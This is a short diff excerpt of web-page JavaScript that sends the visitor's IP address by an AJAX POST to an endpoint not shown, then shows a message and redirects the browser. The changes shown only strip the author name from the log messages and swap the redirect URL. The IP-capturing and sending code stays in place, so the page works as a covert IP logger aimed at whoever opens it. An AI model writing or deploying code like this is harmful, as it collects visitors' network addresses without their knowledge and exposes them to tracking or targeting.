@@ -9,13 +9,13 @@
                                                  contentType: "application/json", 
                                                  data: JSON.stringify({"content": "IP Address: " + ipAddress}), 
                                                  success: function() { 
-                                                         console.log("IP address sent to makosman!"); 
+                                                         console.log("IP address sent !"); 
                                                          $("#message2").fadeIn(2000).fadeOut(2000, function() { 
-                                                                 window.location.href = "http://makos.rf.gd"; 
+                                                                 window.location.href = "http://coconut7373.github.io"; 
                                                          }); 
                                                  }, 
                                                  error: function(xhr, status, error) { 
-                                                         console.error("Error sending IP address to makosman: " + error); 
+                                                         console.error("Error sending IP address : " + error); 
                                                  } 
                                          }); 
                                  }); 
